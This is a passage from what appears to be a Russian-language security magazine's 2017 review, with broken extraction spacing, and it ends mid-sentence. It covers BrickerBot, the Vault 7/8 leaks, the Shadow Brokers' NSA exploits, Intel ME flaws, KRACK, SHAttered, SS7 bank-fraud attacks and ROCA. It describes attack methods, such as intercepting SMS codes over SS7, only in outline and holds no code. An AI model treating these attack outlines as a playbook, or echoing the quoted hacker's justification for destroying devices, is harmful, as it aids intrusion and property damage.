   Аналити ки Radware сразу предположили, что автор вредоноса может быть
сво его рода «мсти телем», который зачищает сеть от небезопасных устрой‐
ств, преподавая жестокий урок их владельцам. Все же BrickerBot — это ред‐
кий в наши дни обра зец малвари, которая создана не ради финансовой
выгоды.
   Вскоре журналисты издания Bleeping Computer про вели собственное рас‐
следование и не толь ко вычислили, кто раз работчик мал вари, но и сумели
с ним пообщаться. Беседа показала, что сотрудни ки Radware были абсолют‐
но правы. Соз дателем BrickerBot ока зался хакер, известный под псев‐
донимом janit0r. Он рассказал, что его, как и многих, пот рясли беспорядоч‐
ные DDoS‐атаки, которые в 2016 году устра ивали  IoT‐ботнеты.  Janit0r
полагал, что эти крупные инциденты вынудят индустрию взяться за ум
и начать дей ствовать сообща, но вскоре стало очевид но, что ничего подоб‐
ного не про исходит. Тогда хакер решил взять дело в свои руки и написал
BrickerBot.



            «Я  рас сматриваю  свой  проект  как  фор му
            „химиоте рапии для интерне та“, а о себе иног-
            да в шутку думаю как о Док торе. Химиоте-
            рапия — это жес ткое лечение, и ник то в трез-
           вом уме не наз начит ее здоровому пациенту,
            но интернет серьезно заболел в третьем и чет-
            вертом квар тале 2016 года, а обыч ных средств
             ока залось недос таточ но. Побоч ные эффекты
             от лечения жес токи, но альтер натива (мил-
            лионные  DDoS-ботнеты)  была  бы  гораз до
              хуже. Я могу лишь наде яться на то, что, когда
              у  IoT нас тупит рецидив, мы найдем луч шие
            способы решения проблем», — писал janit0r.



Как выяснилось, аналити ки Radware описали BrickerBot не совсем точ но и на
самом деле малварь была гораз до сложнее. По словам разработ чика, речь
шла об использовании 86 про токо лов и payload, спе цифичных для опре‐
деленных устройств. К тому же janit0r объяснил, что сначала BrickerBot пыта‐
ется помочь заражен ному устройству, устра нив най денные в нем уязвимости,
ничего при этом не повреждая. «Окирпичивание» — это «план Б», если другие
методы не сработали.
   Janit0r сообщил, что уже в янва ре 2017 года количес тво пос традав ших
от атак BrickerBot устрой ств составляло 200 тысяч, а на момент общения
с журналистами и вовсе перешаг нуло отметку в два мил лиона.



             «Когда‑то отметка в 200 тысяч „окир пиченных“
           юнитов виделась мне чем‑то большим, и я был
             уве рен, что приближа юсь к концу. Теперь счет
            перева лил за два миллиона, и ста ло ясно, что
             я не представ лял (и до сих пор не пред став-
              ляю), нас колько глу бока кроличья нора небезо-
            пас ности  IoT. Уве рен, худ шее ждет нас впе-
             реди, — пишет janit0r. — Наде юсь, необыч ное
            поведе ние BrickerBot помогло пра вительствам,
            вендорам  и  индус трии  в  целом  выиграть
          еще один год, за который они смогут взять
            текущий кош мар  IoT-безопас ности под  кон-
              троль».



В частнос ти, от атак BrickerBot пострадал калифорнийский провай дер Sierra
Tel и его кли енты. Инци дент произошел 10 апреля 2017 года: абоненты вре‐
менно лишились дос тупа в интернет и телефонной связи. Хотя изначально
предполагалось, что проблема была вызвана неудач ным обновлением ПО,
которое распространила компания, 11 апреля представители провайдера
сообщили, что Sierra Tel стал жертвой хакеров. Факт атаки подтвер дил и сам
janit0r, он полагает, что «Sierra незаслужен но получи ла пло хой PR лишь из‐за
того, что была чес тна относительно хака и не стала ничего скры вать».
  Проблема заключалась в ата ках на модемы ZyXEL HN‐51, которые Sierra Tel
массово пре дос тавляет своим кли ентам. После атак BrickerBot устройства
уже не могли функционировать нор мально, и пред ста вители провайдера ста‐
ли советовать пострадавшим обращаться в офи сы ком пании за заменой.
Однако в Sierra Tel недо оценили масштабы проб лемы: уже через несколько
часов модемы для замены попросту закончились, а пострадавшие поль‐
зователи про должали при ходить в офисы. В итоге сот рудники компании были
вынуждены забирать у пользователей вышедшее из строя оборудование,
обе щая отремонтировать или заменить его «в самом скором будущем».
Окончательно последс твия инци дента были устранены лишь в конце апре ля.
  В декабре 2017 года автор BrickerBot неожи дан но вновь вышел на связь
с изданием Bleeping Computer. Как оказалось, janit0r решил уйти на покой,
а за про шедший год ему уда лось вывести из строя или «спас ти» более десяти
миллионов устройств.
  К данному решению gray hat’а под толкнули не только воз можные юри‐
дические последствия его действий. Дело в том, что мил лионы скомпромети‐
рованных устрой ств janit0r скло нен рассматривать как успех, но недавно он
задумался о дру гой сто роне проблемы: о том, что из‐за его деятельности
люди поч ти перес тали боять ся интерне та вещей и забыли, как много уяз‐
вимых девай сов окру жают их каждый день.
  В  ито ге  хакер решил,  что пришло время  остановить ся, он более
не намерен вмешиваться в «естественный ход вещей». Перед уходом janit0r
обнародовал часть исходных кодов BrickerBot и его атакующих модулей,
которые счел наиме нее опасными. К примеру, публиковать краулер SSH он
все же не решился.





          данным исследователей Securai, роутеры TP‐Link M5350 готовы →По
      сообщить пароль администра тора (в формате обыкновенного текста)
       любому, кто приш лет SMS‐сообщение с соответс тву ющим запросом

          пания IOActive пре дупредила, что более двадцати моделей роуте‐ →Ком
      ров Linksys можно полностью ском прометировать удаленно

         зави симые специалисты выяви ли  уяз вимости  в DVR‐системах →Не
      и  камерах  наблюдения  китайской  компании  Dahua,  а  также
       в камерах 354 других производите лей, которые комплек туют свои
       гаджеты «дырявым» веб‐сервером

          лити ки Wordfence заметили, что «дырявые» роуте ры государс твен‐ →Ана
       ного алжирского про вай дера Telecom Algeria массово брутфорсят
       сай ты под управле нием WordPress
VAULT 7: WIKILEAKS
ПУБЛИКУЕТ
ИНСТРУМЕНТЫ ЦРУ


В марте 2017 года сайт  Wikileaks на чал публикацию большого дампа
под кодовым названием Vault 7, содержащего подробности работы Цен траль‐
ного разведывательного управления (ЦРУ) США. Первая публикация вышла
под названи ем «Год зеро» (Year Zero) и содержала 8761 файл из зак рытой
сети Центра радиотехничес кой и электронной разведки ЦРУ в Лэнгли. Тогда
офи циальный пресс‐релиз гласил:



            «Недав но ЦРУ утра тило контроль над большей
            частью своего хакер ского арсе нала, вклю чая
            вре донос ное ПО, вирусы, трояны, экс плоиты
            для уяз вимос тей нулевого дня, вре донос ные
            сис темы  уда ленного  дос тупа  и  связанную
             с  этим  документацию.  Эта  исклю чительная
             коллекция,  нас читыва ющая  нес колько  сотен
           миллионов строк кода, дару ет своим обла дате-
           лям всю хакер скую мощь ЦРУ. Данный архив,
             судя по все му, без над лежаще го раз решения
            цир кулировал сре ди быв ших пра вительствен-
            ных  хакеров  США  и  под рядчиков,  один
             из которых пре дос тавил часть архива в рас-
            поряже ние Wikileaks».



В ито ге достоянием общественности стала информация о большой час ти
хакерско го арсенала ЦРУ. При этом само кибероружие опубликовано
не было, но документация проливала свет на кон кретные техники и методы
спецслужб, давала понять, какие уязвимос ти имеются в арсе нале ЦРУ, и рас‐
сказыва ла, например, о том, что даже «умный» телевизор может шпи онить
за сво им владельцем.
  С марта по август 2017 года под гри фом Vault 7 почти каж дую неделю
выходили новые публикации, в деталях повес твующие о работе хакеров спец‐
служб и их инструмен тах. ][ расска зывал почти обо всех этих релизах под‐
робно:
 • Weeping Angel — инструмент для взлома телеви зоров Samsung;
 • Sonic Screwdriver, DarkSeaSkies, Triton и NightSkies — решения для взлома
   iPhone и Mac;
 • Marble — один из наибо лее «безобидных» инструментов в арсе нале ЦРУ,
   пред назна чен для обфускации кода, позволяет «сбить со следа» кибер‐
   кри миналистов и обмануть антивирусные решения;
 • Grasshopper — фреймворк для создания Windows‐мал вари;
 • Scribbles — инс трумент, поз воля ющий помечать и отсле живать файлы Mi‐
   crosoft Oﬃce;
 • AfterMidnight и Assassin — два фрей мворка для Windows‐мал вари;
 • Athena — имплант для заражения практически любых Windows‐систем,
   разработан ный сто рон ней компанией;
 • Pandemic — «устойчивый» имплант. Предназначен для атак на устрой ства
   под управлением Windows, использующим общие папки, к которым поль‐
   зователи обращаются пос редс твом SMB;
 • CherryBlossom — инструмент для ком прометации разных моделей домаш‐
   них роутеров;
 • Brutal Kangaroo (ранее EZCheese) — решение для проникновения в изо‐
   лиро ванные от сети и офлай новые компь ютеры;
 • ELSA — отслеживает местоположение пользователей, которые работают
   с поддержи вающи ми Wi‐Fi устройствами (к примеру, ноутбуками на базе
  ОС семей ства Windows);
 • OutlawCountry — модуль ядра для Linux 2.6, который помогает специалис‐
   там ЦРУ перенап равлять исхо дящий тра фик с зараженного устройства
   на сторону;
 • BothanSpy и Gyrfalcon — инструменты для хищения учетных данных SSH
   и прослушивания тра фика;
 • HighRise — Android‐приложение для перехвата и перенаправления SMS‐
   сообщений;
 • Achilles, Aeris и SeaPea — решения для взлома macOS и POSIX‐сис тем;
 • Dumbo — инс трумент для отклю чения камер, мик рофонов, сетевых адап‐
   теров и любой сле дящей аппаратуры;
 • CouchPotato — решение для удален ного захвата видеопотоков;
 • ExpressLane —  инс трумент,  который  помогает ЦРУ  присматри вать
   за ведомс тва ми‐партнерами, в число которых входят ФБР, АНБ и Минис‐
   терство внутренней безопасности;
 • Angelﬁre — фреймворк для атак на компьютеры, работа ющие под управле‐
  нием Windows XP и Windows 7.

Однако во всех этих дам пах Wikileaks обна родовала именно документацию
(пусть часто и сек ретную), но не показывала сами инс трументы и исходные
коды. Еще в мар те Джулиан Ассанж провел онлай новую пресс‐конференцию,
в ходе которой пояс нил, что вначале Wikileaks должна дать фору про изво‐
дителям и поделиться под робнос тями и исходными кодами с крупными вен‐
дорами, уязвимос ти в продуктах которых эксплуатируют спецслужбы. «После
этого, когда мы „разоружим“ эти прог раммы, удалив из них критические ком‐
поненты, мы опуб ликуем дополнитель ные детали случившегося», — заверял
тог да Ассанж.
  Лишь в начале ноября 2017 года Wikileaks начала претворять эти сло ва
в жизнь. Портал анонсировал новую серию пуб ликаций, которая получи ла
наз вание  Vault  8. Под этим именем  Wikileaks пообещала выкладывать
исходные коды правительственной малвари и инстру ментов.
  Первые исходни ки уже были обнародованы. Начало циклу публикаций Vault
8 положил тулкит Hive — фреймворк, предназначенный для управления
имплантами на зараженных компь ютерах. При этом в исходных кодах Hive был
обнаружен очень интерес ный нюанс. Дело в том, что для мас кировки своей
деятель нос ти Hive использовал поддельные цифровые сертификаты, выдавая
себя за «Лабораторию Кас перско го». Таким образом, для системного адми‐
нистратора, изу чающего логи, подоз рительный трафик, идущий от мал вари
ЦРУ в сети его организации, выглядел как странная активность, напрямую
связанная с «Лаборатори ей Кас перско го» и ее про дуктами.
   Ев гений Касперский пос пешил сооб щить в сво ем твиттере, что спе‐
циалис ты «Лаборатории Касперского» проверили эту информацию и пришли
к выводу, что сертификаты действи тельно были подделкой, то есть поль‐
зователи, сервисы и приватные ключи компании никак не пос традали. Пос ле
этого новых публикаций под эги дой Vault 8 более не выходило. Ждем раскры‐
тия других исходников в 2018 году.





         ходе изучения данных Vault 7 эксперты Symantec приш ли к выводу, →В
       что ЦРУ связано как минимум с сорока атаками на различные пред‐
      приятия и организа ции в шестнад цати стра нах мира

            ставите ли компаний Apple и Google сообщили, что большинс тво →Пред
       уязвимостей, которые использовало в своих решениях ЦРУ, уже
       исправ лены
УТЕЧКА ЭКСПЛОИТОВ
АНБ


По ка Wikileaks рассказывала всему миру о хакерском инс тру ментарии ЦРУ,
звание глав ного «сли ва» года заво евали дампы, опубликован ные хакерской
груп пой The Shadow Brokers.
  История о похище нии «кибероружия АНБ» началась еще летом 2016 года,
и мы вни мательно сле дили за раз вити ем событий. Почти год, вплоть до вес‐
ны 2017‐го, груп пировка The Shadow Brokers тщетно пыталась продать
огромный дамп данных, в состав которо го вош ли похищенные у АНБ экспло‐
иты для самых раз ных платформ. Хакеры не раз доказывали, что в их руках
дей ствительно есть ценная информа ция и они не бле фуют. Группировка
пыталась устро ить аукцион, кра удфандинг, пыталась дробить дамп на час ти
и выставлять на про дажу отдельные инструменты, но не помогало ничто.
Покупатель так и не нашелся. Отча явшись, The Shadow Brokers даже успели
объ явить, что уходят на покой.
  В апре ле 2017 года груп па прервала длительное мол чание. Больше
хакеры не предпринимали попыток про дать украденную у АНБ информа цию,
они просто опуб ликовали экс пло иты в откры том доступе и совер шенно бес‐
плат но. Первый «слив» был посвящен инс трумен там для компромета ции Unix‐
систем, а через неделю группа опубликовала второй дамп, содер жащий экс‐
пло иты для Windows.
  В итоге The Shadow Brokers мож но косвенно обвинить в половине воз‐
никав ших в 2017 году проблем и круп ных атак. Ведь именно различные инс‐
трументы из утекшего в Сеть арсе нала АНБ (вклю чая EternalBlue, DoublePul‐
sar, EternalSynergy и EternalRomance) использовались во вре мя инцидентов
WannaCry, NotPetya, Bad Rabbit, а так же были взяты на вооружение сотнями
хакерских групп и вирусо писателей.
  Сами The Shadow Brokers при этом не исчезли со сцены. В мае 2017 года
груп пировка сообщи ла, что в открытом доступе были опубликованы далеко
не все ценные дан ные. Когда эпи демия WannaCry сде лала The Shadow Bro‐
kers неплохую рек ламу, хакеры предложили всем желающим оформить под‐
писку на сервис «Ежемесячный дамп The Shadow Brokers» (TheShadowBrokers
Data Dump of the Month), чье название говорит само за себя.
   Груп пировка пообе щала ежемесяч но публиковать новые хакерские инс‐
трументы для своих под писчиков, в том числе экс плоиты для браузеров,
роутеров, мобильных устрой ств и Windows 10, скомпро метированные данные
из сетей про вай деров SWIFT и банков, а так же дан ные о ядерных и ракетных
программах России, Китая, Ирана и Северной Кореи. Сначала хакеры оце‐
нили подписку в 100 Zcash (около 22 тысяч дол ларов по курсу на тот момент),
но позже подняли цену до 200 ZEC (Zcash) или 1000 XMR (Monero), то
есть 46–64 тысячи долларов в то вре мя.
  Спе циалисты по информа ционной безопасности Мэтью Хики (Matthew
Hickey), @X0rz, Николас Уивер (Nicholas Weaver) и Тим Страццере (Tim
Strazzere) попыта лись сделать доброе дело и запустили на Patreon кра‐
удфандинговую кампанию по сбо ру средств на приобретение новых экспло‐
итов. Специалис ты рассчитывали подписать ся на рассылку хакеров, а после
сра зу передать эксплоиты и информацию о багах производителям уязвимых
решений. Предполагалось, что жертвователи, поучас тво вавшие в сборе
средств, так же получат дос туп к дампу, но после производителей.





Хотя все го за 36 часов было собрано почти четыре тысячи долларов, в итоге
краудфандинговую кам панию закрыли. Дело в том, что ини циаторы сбо ра
средств все же решили посоветовать ся с юристами — а те пришли в ужас
от про исходящего.



            «Если захотите услы шать, как адвокат кричит
           матом по телефону, прос то поз воните ему
            и рас ска жите, что орга низовали пер вый в мире
            опенсор сный кра удфандинг, чтобы попытаться
            приобре ти кибероружие, — рас ска зывал Мэтью
             Хики. — Ока залось,  что,  как  только деньги
            перейдут из наших рук в руки The Shadow Bro-
               kers, мы очень рис куем и можем стать своего
            рода   жер твой  юридичес ких   сложностей.
            Это  ока залось  слиш ком  рис кованно,  нам
            посове това ли ни при  каких обстоятельствах
            не продолжать дальше».



Чем сейчас занимается The Shadow Brokers, допод линно неиз вестно: в пос‐
ледний раз группа «выходила на связь» в кон це осени. Хотя в теории новые
дампы хакеров могут содер жать какие‐то интересные данные, ИБ‐специалис‐
ты настро ены крайне скептически. Дело в том, что, даже если оставить
за скобками эти ческий аспект, на этот раз зло умышленники не предос тавля‐
ют каких‐либо серьезных доказа тельств наличия у них ценной информации,
но при этом требуют огромные суммы. Кроме того, один из под писчиков сер‐
виса злоумышленников уже жаловался, что зап латил десятки тысяч долларов
(500 XMR) за совершенно бесполезную информацию. Так что ценность новых
дампов пока остается под вопросом.





          па The Shadow Brokers разослала сво им подписчикам очеред ной →Груп
      дамп и выступила с угро зами в адрес неназ ванного сотрудни ка АНБ

          Shadow Brokers расска зали миру об экс плоите UNITEDRAKE — →The
       модульной плат форме для атак на машины, работающие под управле‐
      нием Microsoft Windows (XP, Windows Server 2003 и 2008, Vista, Win‐
      dows 7 SP 1 и ниже, а также Windows 8 и Windows Server 2012)
АППАРАТНЫЕ
ПРОБЛЕМЫ


2017 год оказался богат на рас крытие информа ции о множестве аппаратных
проблем в решениях  Intel, Broadcom и дру гих крупных производителей
железа. Как отмечают специалисты Positive Technologies, уязвимос ти, подоб‐
ные багам, най ден ным в сос таве Intel Management Engine, не могут не пов‐
лечь за собой пос ледствий. Если злоумыш ленники сумеют вос пользоваться
такими проблемами, таргетированные атаки, рав но как и атаки вымогателей,
могут вый ти на принципиально новый уровень. Данные пользовате лей будут
не просто бло киро вать ся — атакующие смогут ломать саму материнскую пла‐
ту.
  Наиболее серьезной аппа ратной проблемой ухо дящего года определен‐
но можно наз вать устранение сразу нес кольких серьезных уязвимос тей
в продук тах Intel Management Engine (ME), Intel Server Platform Services (SPS)
и Intel Trusted Execution Engine (TXE). Об уяз вимостях в конце нояб ря сооб‐
щили сами инженеры компании Intel.
  По  сути, данные баги позволяют ата кующему уста навливать руткиты
на уязвимые ПК и провоцировать отказ в их работе, а также извле кать
информацию, обрабатываемую процес сором. Хотя для экс плуатации этих
проблем чаще все го тре бует ся локальный доступ (и луч ше всего в качестве
адми нистратора или при виле гиро ванного поль зователя), это не слишком
помогает снизить их потенциальную опас ность.
  По данным Intel, найден ные проблемы опас ны для сле дующих продуктов:
 • 6, 7 и 8‐го поколе ний процессоров Intel® Core™;
 • процессоров Intel® Xeon® E3‐1200 v5 и v6;
 • процессоров Intel® Xeon® линейки Scalable;
 • процессоров Intel® Xeon® линейки W;
 • процессоров Intel® Atom® линей ки C3000;
 • процессоров Apollo Lake Intel® Atom серии E3900;
 • процессоров Apollo Lake Intel® Pentium™;
 • процессоров Celeron™ серий N и J.

Таким образом, уязвимос ти представляют угрозу для миллионов устройств,
работа ющих на базе данных CPU. Хотя раз работчики Intel уже подготовили
соот ветствующие патчи, исправ ления не будут дос тупны широкой пуб лике,
так как предназначаются для вендоров, которые должны будут самостоятель‐
но интегри ровать «заплатки» в свои решения. Некоторые производители уже
сообщили о примерных сроках выхода готовя щихся патчей, тог да как дру гие
предпочли отключить Intel Management Engine вовсе.
  Нужно отме тить, что ИБ‐специалис ты неред ко называют бэкдором сам In‐
tel Management Engine (ME), который позволяет устанавливать удаленное
соединение с ПК посредством Intel Active Management Technology (AMT).
  Напомню, что Intel Management Engine — это закрытая технология, которая
представ ляет собой интегри рованный в микросхему Platform Controller Hub
(PCH) микроконтроллер с набором встро енных периферийных устройств.
Именно через PCH проходит почти все обще ние процессора с внешними
устройствами, то есть Intel ME имеет доступ практически ко всем данным
на компьюте ре и возможность исполнять сторон ний код, что в теории поз‐
воля ет пол ностью скомпро метировать плат форму посредством ME.
  Более того, Intel ME работает отдельно от всего осталь ного, даже когда
компьютер выключен, то есть компромета цию через Intel ME вряд ли обна‐
ружат стандар тные защитные решения. Они попросту ее «не увидят».
    Intel ME инте ресует и бес покоит специалистов уже давно, но в последнее
вре мя их интерес еще возрос. Так, одной из причин была уязвимость, обна‐
руженная весной 2017 года, а летом и вов се ста ло известно, что технологию
ME для обхода файрволов эксплу атируют хакеры.
  Кроме того, инте рес ИБ‐экспертов подог рел недавний переход данной
под системы на новую аппаратную (x86) и прог раммную (доработанный MINIX
в качес тве операционной системы) архи тектуры. Так, эксперты Positive Tech‐
nologies, представившие в конце лета способ частичного обхода ME, объ‐
ясняли, что при мене ние платформы x86 поз воляет использовать всю мощь
средств анализа бинарного кода, что ранее было затрудни тельно,  так
как до 11‐й версии использовалось ядро с малораспространенной системой
команд — ARC.
   Как уже было сказано выше, ряд про изво дителей (а именно ком пании
Purism, Dell и System76) приняли решение отка зать ся от использования Intel
ME в сво их про дуктах вообще. Хотя раз работчики отме тили, что отключение
этого механизма оказалось нет ривиальной задачей, деактивация все же
увен чалась успе хом.





          циалис ты Google Project Zero обнаружили RCE‐уязвимость в Wi‐Fi →Спе
      SoC (System on Chip) компании Broadcom. Данные решения исполь‐
       зуют ся во мно жестве устройств, в том чис ле в смар тфонах Samsung,
       Nexus 5, 6 и 6P, а так же во всех моделях iPhone, начиная с iPhone 4,
      и новых iPod и iPad

         зави симый эксперт выявил RCE‐уяз вимость в семействе чипов →Не
      Broadcom BCM43xx, которые можно найти в устройствах  Apple,
       Google (Nexus), Samsung, HTC, LG и других

          конференции Black Hat USA рассказали о нес коль ких уязвимос тях →На
       в имплементациях Intel UEFI BIOS, которые используют мно гие про‐
       изво дители материнских плат. Баги позволяют обойти защит ные
       механизмы BIOS, в том числе Intel Boot Guard и Intel BIOS Guard, а так‐
      же изменить или подменить сам UEFI BIOS, к примеру внед рив в него
       руткит
КРИПТОГРАФИЧЕСКИЕ
ПРОБЛЕМЫ


К сожале нию, уязвимости и недос татки регулярно обнаруживают не только
в приложе ниях и железе, их так же находят в сос таве протоколов и алгорит‐
мов, и в теории такие баги могут пов лечь за собой настоящий эффект
домино.





KRACK
В WPA2 обнаружили целый комплекс уязвимос тей, получивший название
KRACK (аббре виатура от Key Reinstallation Attacks). О проблемах миру сооб‐
щила сводная груп па иссле дователей, в которую вошли: Мэти Ванхоф (Mathy
Vanhoef) и Фрэнк Писсенс (Frank Piessens) из Лёвенско го католического уни‐
верситета, Малихех Ширванян (Maliheh Shirvanian) и Нитеш Саксена (Nitesh
Saxena) из Ала бамского университета в Бирминге ме, Юн Ли (Yong Li) из ком‐
пании Huawei Technologies, а также предста витель Рурско го университета
Свен Шеге (Sven Schäge).
   Краеуголь ный камень проб лемы — четырехэлементный хендшейк WPA2.
Данный  хендшейк  осуществляется,  ког да  клиент  хочет  подключиться
к защищенной сети Wi‐Fi. Он используется для подтверждения того, что обе
стороны (клиент и точка доступа) обла дают коррек тны ми учетными данными.
В то же вре мя хендшейк используется для согласова ния све жего ключа шиф‐
рования, который впос ледствии будет применяться для защиты трафика.
В настоящее время практически все защищенные Wi‐Fi‐сети используют
именно такой, четыре хэлементный хендшейк. Что делает их все уязвимыми
перед какой‐либо вари ацией атак KRACK.



             «Ата ка работа ет против час тных и кор поратив-
            ных  Wi-Fi-сетей,  против  уста рев шего WPA
            и све жего  стандарта WPA2 и даже против
              сетей,  которые  используют  исклю чительно
             AES. Все наши ата ки, нап равленные на WPA2,
            используют  новатор скую  технику  реинстал-
            ляции клю чей (key reinstallation)», — объясняют
             авторы KRACK.



По сути, KRACK поз воля ет устроить атаку типа man in the middle и при нудить
участни ков сети выполнить реинсталляцию клю чей шиф рования, которые
защища ют трафик WPA2. К тому же, если сеть нас троена на использование
WPA‐TKIP или GCMP, зло умышленник сможет не только прослушивать трафик
WPA2, но и инжектировать пакеты в дан ные жертвы.
  Ме тод KRACK уни вер сален и работает против любых устройств, под клю‐
ченных к Wi‐Fi‐сети. То есть в опасности абсолют но все пользователи An‐
droid, Linux, iOS, macOS, Windows, OpenBSD, а так же мно гочис ленные IoT‐
устройства. Единственная хорошая новость — ата кующий обя зательно дол‐
жен находиться в зоне дей ствия целевой Wi‐Fi‐сети, то есть атаку не получит‐
ся провести удаленно.
  При этом исследователи отмечают, что для атак на раз личные сис темы
при дется исполь зовать разные вариации KRACK. Степень серь езности проб‐
лем тоже варьируется. К при меру, специалис ты пишут, что атаки на Linux
и Android (старше версии 6.0) могут носить «катас трофичес кий характер»
из‐за использования клиента wpa_supplicant. Дело в том, что в случае эксплу‐
ата ции найденных уязвимостей wpa_supplicant 2.4 и выше не просто произве‐
дет реинсталляцию реального ключа, но уста новит ключ, состоящий из одних
нулей.
   Уяз вимос тям, вошедшим в состав KRACK, были присвоены следующие
иден тификаторы: CVE‐2017‐13077, CVE‐2017‐13078, CVE‐2017‐13079, CVE‐
2017‐13080, CVE‐2017‐13081, CVE‐2017‐13082, CVE‐2017‐13084, CVE‐2017‐
13086, CVE‐2017‐13087 и CVE‐2017‐13088.
  В итоге сло жилась интерес ная ситуация, ког да патчить нужно практичес ки
все. Уяз вимы как сами точки доступа, так и под клю ченные к ним устройства.
Хотя спе циалисты полагают, что большинство атак в будущем при дется
непосредственно на клиенты, обновить в любом случае нуж но все. К тому же
некоторые устройства могут одновременно быть точкой доступа и клиентом,
к при меру беспро водные репитеры. На специальной странице мы собрали
спи сок уязвимых произво дителей, вышедших и запланированных обновле‐
ний.





Взлом SHA-1
Алгоритм хеширо вания SHA‐1 был раз работан еще в 1995 году специалис‐
тами АНБ, совместно с учеными из NIST (Наци ональ ный институт стандартов
и технологий США). Первые признаки устаревания этого алгоритма, долго
слу жив шего   верой   и   правдой,   аналитики   стали   обнаруживать
еще в 2005 году: именно тогда эксперты заговорили о потенциальной воз‐
можнос ти взлома SHA‐1 через коллизи онную ата ку, что в теории давало зло‐
умыш ленни кам возможность создать поддель ный файл, с таким же SHA‐
1 хешем, как у настоящей версии файла.
   Крип тографы и эксперты давно говорили о необходимости перехо да
на более стойкие SHA‐2 и SHA‐3, и компании прислушива лись к этим
советам. Так, организация Mozilla объяви ла о прек ращении поддержки SHA‐
1 в Firefox 52, а также от SHA‐1 уже отка зались и раз работчики Chrome. Тем
не менее до недав них пор дискуссии о ненадежности SHA‐1 велись исклю‐
чительно в теоре тическом поле, так как фактически взлом алгоритма про‐
демонстри рован не был.
  Ближе все го к фактической компромета ции SHA‐1 подошла свод ная груп‐
па  уче ных, осенью 2015  года пред ставившая  доклад под  наз вани ем
The SHAppening. Тогда эксперты доказа ли, что SHA‐1 уязвим к атакам,
которые они назвали freestart collision. Атака опи рается на коллизии хеш‐фун‐
кций.
  О том, что подоб ное возможно, еще в 2012 году писал извес тный крип‐
тограф и писатель Брюс Шнайер (Bruce Schneier). Он полагал, что про веде‐
ние подобной ата ки к 2015 году будет оценивать ся в 700 тысяч долларов,
а к 2018 году в 173 тысячи долларов. Однако Шнайер ошибся. По данным
иссле дователей, в 2015 году ата ка обош лась бы хакерам лишь в 75–
120 тысяч долларов. Такое стало воз можно благодаря раз работанной уче‐
ными тех нике boomeranging, использующей GPU. Именно вскоре после пуб‐
ликации это го док лада Mozilla, Microsoft и Google объявили о своем решении
пос корее «расстать ся» с SHA‐1.
  В фев рале 2017 года SHA‐1 был повер жен окончательно стараниями спе‐
циалис тов ком пании Google, при поддержке ученых из нидерландского Cen‐
trum Wiskunde & Informatica (Центр матема тики и информатики), работав ших
и  над  докладом  The  SHAppening.  Исследователи  представили  отчет,
в котором рассказали о первой реально осущест вленной коллизионной атаке
на SHA‐1, получив шей имя SHAttered.





Единственная хорошая новость заключается в том, что инже неры Google опи‐
сывают атаку как «один из наибо лее массивных вычис лительных про цессов
на все вре мена», то есть сколь‐нибудь ско ро повторить проделан ную коман‐
дой работу вряд ли кому‐то удастся.
   Хо тя угро за повторения таких атак зло умышленниками пока мала, спе‐
циалис ты все же отло жили пуб ликацию proof‐of‐concept кода на стандар‐
тные 90 дней, давая компаниям три месяца на подготов ку. Стоит понимать,
что компьютер ные вычисления становятся дешевле день ото дня, и скоро
на генерацию кастомного SHA‐1 хеша будут ухо дить месяцы или и того мень‐
ше.
  Иссле дователи при водят интересную статистику, которая хорошо помога‐
ет понять масштаб про деланной ими работы. Так, для реализации атаки пот‐
ребовалось осуществить 9 223 372 036 854 775 808 операций. Один CPU
занимался  бы  этими  вычислени ями  6500   лет,  а  у  одного  GPU
ушло бы 110 лет. Атака SHAttered в 100 тысяч раз быс трее брутфорс‐ата ки,
полага ющей ся на парадокс дней рож дений, то есть на брутфорс‐ата ку
у одного GPU ушло бы около 12 миллионов лет.





Баги в SS7
Эксперты уже дав но предупрежда ют о небезопасности набора сигнальных
телефонных протоко лов SS7 (или ОКС‐7, Сис тема сигнализации №   7),
который до сих пор используют операто ры связи по все му миру. Дело в том,
что SS7 был разработан еще в 1975‐м, а в настоящее вре мя он безнадежно
устарел и фактически не име ет никакой защиты.
  Иссле дователи не раз доказы вали небезопас ность SS7 и даже описывали
воз можные спо собы эксплуата ции проблем стека. К примеру, немецкий
эксперт Тобиас Энгель (Tobias Engel) дважды выс тупал на конференции
Chaos Communication Congress в 2010 и 2014 годах, предупреждая о том, что
при помощи SS7 можно обна ружить и отследить практически любого жителя
планеты, просто зная его телефонный номер.
  В том же 2014 году специалисты ком пании Positive Technologies Дмитрий
Курбатов и Сергей Пузан ков представили доклад на конференции Positive
Hack Days, в котором рас сказывали не только о прос лушке, но и о мно гих дру‐
гих воз можнос тях хакеров в сиг наль ной сети SS7 (включая DoS‐атаки, фрод,
перевод денег, перехват SMS‐сообщений и опре деление местоположения
або нента без его ведома).
  Тем не менее за про шедшие годы ник то ни разу не сооб щал о реальных
ата ках с использованием SS7. Первый случай эксплу атации уяз вимостей зло‐
умыш ленни ками удалось обна ружить журналис там немецкого издания Süd‐
deutsche Zeitung. В мае 2017 года журналисты предста вили результаты собс‐
твен ного рассле дования, сог ласно которому преступники атакуют SS7, чтобы
обходить  двух факторную аутентификацию бан ков и осу щест влять неав‐
торизованные тран закции с чужих счетов.
  По данным издания, сначала злоумыш ленни ки собирают информа цию
о банковском аккаунте жертвы, ее учетных дан ных и номере телефона,
используя для это го малварь или фишинг. Затем преступники совер шают ата‐
ку на SS7, чтобы узнать идентификатор mTAN (mobile transaction authentication
number), который банк отправляет в SMS‐сообщении. По сути, mTAN —
это одноразовый пароль, который бан ки исполь зуют для под твержде ния
транзакций. Атака позволяет переадре совать SMS‐сообщение с паролем
на номер, подконтрольный злоумыш ленникам, пос ле чего оста ется лишь
перевести средства.
   Тот факт, что немецкие пользователи становят ся жер твами таких атак,
журналистам под твер дили предста вители телекоммуника ционной компании
O2‐Telefonica. По их сло вам, атаки начались в середине янва ря 2017 года
и исходят из сетей зарубежных сотовых операторов. При этом специалисты
под черки вают, что для реализации подобных атак потребу ется оборудо‐
вание, которое можно дос тать в откры той продаже, и его суммарная сто‐
имость вряд ли пре высит тысячу долларов.





ROCA
Trusted platform module (TPM) используют ся в бессчет ном количес тве устрой‐
ств и гаджетов для генера ции RSA‐клю чей для VPN, шифрования дисков, дос‐
тупа к обычным акка унтам, работы с сертификатами и так далее.
  Сводная груп па спе циалистов, в которую вош ли представители чешского
Масарикова университета, итальянского уни верситета Ка‐Фоскари и ком‐
пании Enigma Bridge, сооб щила, что все TPM ком пании Inﬁneon Technologies,
выпущенные после 2012 года, содержат уязвимость, ослабляющую крип‐
тографию, из‐за чего надежность RSA‐ключей оказывается под большим воп‐
